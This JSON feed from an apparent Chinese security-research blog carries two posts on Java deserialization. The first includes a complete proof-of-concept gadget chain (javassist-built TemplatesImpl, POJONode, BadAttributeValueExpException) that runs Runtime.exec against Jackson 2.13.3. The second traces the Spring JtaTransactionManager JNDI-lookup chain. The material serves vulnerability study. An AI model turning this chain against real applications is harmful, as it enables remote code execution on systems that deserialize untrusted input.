{
    "version": "https://jsonfeed.org/version/1",
    "title": "love hack • All posts by \"java\" tag",
    "description": "",
    "home_page_url": "https://pr0phet1.github.io",
    "items": [
        {
            "id": "https://pr0phet1.github.io/2025/07/26/security-studies/jackson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/",
            "url": "https://pr0phet1.github.io/2025/07/26/security-studies/jackson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/",
            "title": "jackson原生反序列化",
            "date_published": "2025-07-26T04:58:08.000Z",
            "content_html": "<h1 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h1>\n<p>jackson 在序列化时会调用 get 方法，反序列化时会调用 set 方法<br>\n spring 框架中内置的有 jackson 包，因此我们也需要学习 jackson 的相关序列化调用<br>\n在 POJONode 这一个类中，恰恰可以满足我们的触发条件，去触发 get 方法，具体看下文分析</p>\n<p>管理依赖</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">\t&lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;</span><br><span class=\"line\">\t&lt;artifactId&gt;jackson-core&lt;/artifactId&gt;</span><br><span class=\"line\">\t&lt;version&gt;2.13.3&lt;/version&gt;</span><br><span class=\"line\">\t&lt;/dependency&gt;</span><br><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">\t&lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;</span><br><span class=\"line\">\t&lt;artifactId&gt;jackson-annotations&lt;/artifactId&gt;</span><br><span class=\"line\">\t&lt;version&gt;2.13.3&lt;/version&gt;</span><br><span class=\"line\">\t&lt;/dependency&gt;</span><br><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">\t&lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;</span><br><span class=\"line\">\t&lt;artifactId&gt;jackson-databind&lt;/artifactId&gt;</span><br><span class=\"line\">\t&lt;version&gt;2.13.3&lt;/version&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"pojonode\"><a class=\"anchor\" href=\"#pojonode\">#</a> POJONode</h1>\n<p><img data-src=\"image-20250726102745276.png\" alt=\"image-20250726102745276\"></p>\n<p><img data-src=\"image-20250726103655567.png\" alt=\"image-20250726103655567\"></p>\n<p>可以看到在其父类 BaseJsonNode 类中，书写了 toString 方法</p>\n<p><img data-src=\"image-20250726104101037.png\" alt=\"image-20250726104101037\"></p>\n<p>调用了 InternalNodeMapper.nodeToString，执行了 writeValueAsString，执行序列化对本身，这里的 STD_WRITER 这一常量，我们在追踪看下</p>\n<p><img data-src=\"image-20250726104646009.png\" alt=\"image-20250726104646009\"></p>\n<p>可以看到这一常量就是 JsonMapper.writer () 的返回结果</p>\n<p><img data-src=\"image-20250726105126127.png\" alt=\"image-20250726105126127\"></p>\n<p>JsonMapper.writer () 返回 ObjectWriter 对象</p>\n<p><code>ObjectWriter</code>  是 Jackson 中专门用于序列化对象的组件，它是从  <code>ObjectMapper</code>  衍生出来的，可以提供更灵活的序列化配置</p>\n<p>说白了就是 ObjectWriter 可以简单理解为高配版的 ObjectMapper 序列化，作用不变</p>\n<p>那总结一下调用 BaseJsonNode 的 toString 方法相当于 ObjectWriter,writeValueAsString (BaseJsonNode)</p>\n<h1 id=\"报错原因\"><a class=\"anchor\" href=\"#报错原因\">#</a> 报错原因</h1>\n<p>可以看到停在了序列化 writeObject</p>\n<p><img data-src=\"image-20250726114504968.png\" alt=\"image-20250726114504968\"></p>\n<p><img data-src=\"image-20250726120222881.png\" alt=\"image-20250726120222881\"></p>\n<p>然后就抛出错误停止执行了，究其原因就是可以看到在 POJONode 的父类 BaseJsonNode 中具有 writeReplace 方法</p>\n<h2 id=\"writereplace\"><a class=\"anchor\" href=\"#writereplace\">#</a> writeReplace</h2>\n<ol>\n<li><strong>基本概念</strong>\n<ul>\n<li>在 Java 反序列化过程中， <code>writeReplace</code>  方法是一个特殊的钩子方法，用于在对象被序列化时，替换当前对象。它定义在  <code>ObjectOutputStream</code>  类中，方法签名是  <code>protected Object writeReplace()</code> 。</li>\n<li>当对象被序列化时，如果该对象的类定义了  <code>writeReplace</code>  方法， <code>ObjectOutputStream</code>  会优先调用这个方法来获取一个替代对象，然后对这个替代对象进行序列化操作，而不是直接序列化原始对象。</li>\n</ul>\n</li>\n<li><strong>作用场景</strong>\n<ul>\n<li><strong>对象的安全性增强</strong>\n<ul>\n<li>例如，假设有一个包含敏感信息（如密码等）的对象。在序列化这个对象时，我们不希望敏感信息被暴露。可以利用  <code>writeReplace</code>  方法返回一个新的对象，这个新对象将敏感信息移除或者替换为安全的占位符。</li>\n</ul>\n</li>\n<li><strong>优化序列化数据</strong>\n<ul>\n<li>有时候对象本身可能包含一些在序列化过程中不需要或者不适合存储的数据。通过  <code>writeReplace</code>  方法可以返回一个简化后的对象用于序列化。</li>\n<li>例如，一个对象有一个很大的临时缓存数组，在序列化时可以不需要保存这个数组。就可以在  <code>writeReplace</code>  方法中返回一个去掉了缓存数组的新对象。</li>\n</ul>\n</li>\n<li><strong>处理对象的引用问题</strong>\n<ul>\n<li>在某些情况下，同一个对象可能在多个地方被引用。为了优化序列化后的数据结构或者满足某些特殊的序列化需求，可以使用  <code>writeReplace</code>  来替换对象，使得引用关系在序列化后得到重新组织。</li>\n</ul>\n</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"解决方式\"><a class=\"anchor\" href=\"#解决方式\">#</a> 解决方式</h2>\n<p>因为无法通过源码进行修改，我们可以通过反射直接将这个方法换成别的名字，简单粗暴，</p>\n<p><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">ClassPool</span> <span class=\"variable\">classPool</span> <span class=\"operator\">=</span> ClassPool.getDefault();</span><br><span class=\"line\">classPool.insertClassPath(<span class=\"keyword\">new</span> <span class=\"title class_\">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class=\"line\"><span class=\"type\">CtClass</span> <span class=\"variable\">cc</span> <span class=\"operator\">=</span> classPool.makeClass(<span class=\"string\">&quot;Evil&quot;</span>);</span><br><span class=\"line\">String cmd= <span class=\"string\">&quot;java.lang.Runtime.getRuntime().exec(\\&quot;calc\\&quot;);&quot;</span>;</span><br><span class=\"line\">cc.makeClassInitializer().insertBefore(cmd);</span><br><span class=\"line\">cc.setSuperclass(classPool.get(AbstractTranslet.class.getName()));</span><br><span class=\"line\"><span class=\"comment\">//新增修改writeReplace方法名</span></span><br><span class=\"line\"><span class=\"type\">CtClass</span> <span class=\"variable\">ctClass</span> <span class=\"operator\">=</span> classPool.getCtClass(<span class=\"string\">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);</span><br><span class=\"line\"><span class=\"type\">CtMethod</span> <span class=\"variable\">writeReplace</span> <span class=\"operator\">=</span> ctClass.getDeclaredMethod(<span class=\"string\">&quot;writeReplace&quot;</span>);</span><br><span class=\"line\">writeReplace.setName(<span class=\"string\">&quot;propeht&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//JVM加载修改后的类</span></span><br><span class=\"line\">ctClass.toClass();</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"poc\"><a class=\"anchor\" href=\"#poc\">#</a> poc</h1>\n<p><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> javax.management.BadAttributeValueExpException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.fasterxml.jackson.databind.node.BaseJsonNode;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class=\"line\"><span class=\"keyword\">import</span> groovy.transform.Undefined;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javassist.ClassClassPath;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javassist.ClassPool;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javassist.CtClass;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javassist.CtMethod;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.FileOutputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.FileInputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.ObjectOutputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.ObjectInputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Method;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">poc</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"comment\">//使用javassist定义恶意代码</span></span><br><span class=\"line\">        <span class=\"type\">ClassPool</span> <span class=\"variable\">classPool</span> <span class=\"operator\">=</span> ClassPool.getDefault();</span><br><span class=\"line\">        classPool.insertClassPath(<span class=\"keyword\">new</span> <span class=\"title class_\">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class=\"line\">        <span class=\"type\">CtClass</span> <span class=\"variable\">cc</span> <span class=\"operator\">=</span> classPool.makeClass(<span class=\"string\">&quot;Evil&quot;</span>);</span><br><span class=\"line\">        String cmd= <span class=\"string\">&quot;java.lang.Runtime.getRuntime().exec(\\&quot;calc\\&quot;);&quot;</span>;</span><br><span class=\"line\">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class=\"line\">        cc.setSuperclass(classPool.get(AbstractTranslet.class.getName()));</span><br><span class=\"line\">        <span class=\"type\">CtClass</span> <span class=\"variable\">ctClass</span> <span class=\"operator\">=</span> classPool.getCtClass(<span class=\"string\">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">CtMethod</span> <span class=\"variable\">writeReplace</span> <span class=\"operator\">=</span> ctClass.getDeclaredMethod(<span class=\"string\">&quot;writeReplace&quot;</span>);</span><br><span class=\"line\">        writeReplace.setName(<span class=\"string\">&quot;propeht&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        ctClass.toClass();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">byte</span>[] classBytes = cc.toBytecode();</span><br><span class=\"line\">        <span class=\"type\">byte</span>[][] code = <span class=\"keyword\">new</span> <span class=\"title class_\">byte</span>[][]&#123;classBytes&#125;;</span><br><span class=\"line\">        <span class=\"type\">TemplatesImpl</span> <span class=\"variable\">templates</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">TemplatesImpl</span>();</span><br><span class=\"line\">        setFieldValue(templates, <span class=\"string\">&quot;_bytecodes&quot;</span>, code);</span><br><span class=\"line\">        setFieldValue(templates, <span class=\"string\">&quot;_name&quot;</span>, <span class=\"string\">&quot;prophet&quot;</span>);</span><br><span class=\"line\">        setFieldValue(templates, <span class=\"string\">&quot;_class&quot;</span>, <span class=\"literal\">null</span>);</span><br><span class=\"line\">        setFieldValue(templates, <span class=\"string\">&quot;_tfactory&quot;</span>, <span class=\"keyword\">new</span> <span class=\"title class_\">TransformerFactoryImpl</span>());</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">POJONode</span> <span class=\"variable\">node</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">POJONode</span>(templates);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">bad</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">BadAttributeValueExpException</span>(<span class=\"literal\">null</span>);</span><br><span class=\"line\">        <span class=\"type\">Field</span> <span class=\"variable\">field</span> <span class=\"operator\">=</span> BadAttributeValueExpException.class.getDeclaredField(<span class=\"string\">&quot;val&quot;</span>);</span><br><span class=\"line\">        field.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        field.set(bad, node);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">ObjectOutputStream</span> <span class=\"variable\">out</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectOutputStream</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">FileOutputStream</span>(<span class=\"string\">&quot;ser.ser&quot;</span>));</span><br><span class=\"line\">        out.writeObject(bad);</span><br><span class=\"line\">        out.close();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">ObjectInputStream</span> <span class=\"variable\">in</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectInputStream</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">FileInputStream</span>(<span class=\"string\">&quot;ser.ser&quot;</span>));</span><br><span class=\"line\">        in.readObject();</span><br><span class=\"line\">        in.close();</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setFieldValue</span><span class=\"params\">(<span class=\"keyword\">final</span> Object obj, <span class=\"keyword\">final</span> String fieldName, <span class=\"keyword\">final</span> Object value)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"keyword\">final</span> <span class=\"type\">Field</span> <span class=\"variable\">field</span> <span class=\"operator\">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class=\"line\">        field.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        field.set(obj, value);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"image-20250726125726865.png\" alt=\"image-20250726125726865\"></p>\n",
            "tags": [
                "web",
                "反序列化",
                "java"
            ]
        },
        {
            "id": "https://pr0phet1.github.io/2025/07/25/security-studies/spring-jtaTranscationMannager%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/",
            "url": "https://pr0phet1.github.io/2025/07/25/security-studies/spring-jtaTranscationMannager%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/",
            "title": "spring_jtaTranscationMannager漏洞分析",
            "date_published": "2025-07-25T01:41:36.000Z",
            "content_html": "<h1 id=\"管理依赖\"><a class=\"anchor\" href=\"#管理依赖\">#</a> 管理依赖</h1>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">       &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class=\"line\">       &lt;artifactId&gt;spring-tx&lt;/artifactId&gt;</span><br><span class=\"line\">       &lt;version&gt;3.1.0.RELEASE&lt;/version&gt;</span><br><span class=\"line\">   &lt;/dependency&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">   &lt;dependency&gt;</span><br><span class=\"line\">       &lt;groupId&gt;javax.transaction&lt;/groupId&gt;</span><br><span class=\"line\">       &lt;artifactId&gt;jta&lt;/artifactId&gt;</span><br><span class=\"line\">       &lt;version&gt;1.1&lt;/version&gt;</span><br><span class=\"line\">   &lt;/dependency&gt;</span><br></pre></td></tr></table></figure></p>\n<p>用于 spring 事务管理</p>\n<h1 id=\"漏洞分析\"><a class=\"anchor\" href=\"#漏洞分析\">#</a> 漏洞分析</h1>\n<h2 id=\"jtatransactionmanager\"><a class=\"anchor\" href=\"#jtatransactionmanager\">#</a> JtaTransactionManager</h2>\n<p><img data-src=\"image-20250721111840300.png\" alt=\"image-20250721111840300\"></p>\n<p>可以看到 readObject 方法中调用了 initUserTransactionAndTransactionManager 方法</p>\n<p><img data-src=\"image-20250721104430676.png\" alt=\"image-20250721104430676\"></p>\n<p>在 initUserTransactionAndTransactionManager 方法中又调用了 lookupUserTransaction，值为我们设置的 userTansactionName</p>\n<p><img data-src=\"image-20250721111048635.png\" alt=\"image-20250721111048635\"></p>\n<p>lookupUserTransaction 调用了 JndiTemplate 对象的 lookup 方法</p>\n<h2 id=\"jnditemplate\"><a class=\"anchor\" href=\"#jnditemplate\">#</a> JndiTemplate</h2>\n<p><img data-src=\"image-20250721111145127.png\" alt=\"image-20250721111145127\"></p>\n<p>lookup 方法嵌套调用真正的 lookup，值还是之前的 UserTransactionName</p>\n<p><img data-src=\"image-20250721111315387.png\" alt=\"image-20250721111315387\"></p>\n<p>可以看到在最后调用了 execute 方法</p>\n<p><img data-src=\"image-20250721111459644.png\" alt=\"image-20250721111459644\"></p>\n<p>可以看到 execute 方法内部其实就是</p>\n<p>getContext =》 createInitialContext =》 ctx = InitialContext =》InitialContext.lookup(UserTransactionName)</p>\n<p>然后这里的 UserTransactionName 我们也可以设置</p>\n<p><img data-src=\"image-20250721113855893.png\" alt=\"image-20250721113855893\"></p>\n<p><img data-src=\"image-20250721102137222.png\" alt=\"image-20250721102137222\"></p>\n",
            "tags": [
                "web",
                "反序列化",
                "java"
            ]
        }
    ]
}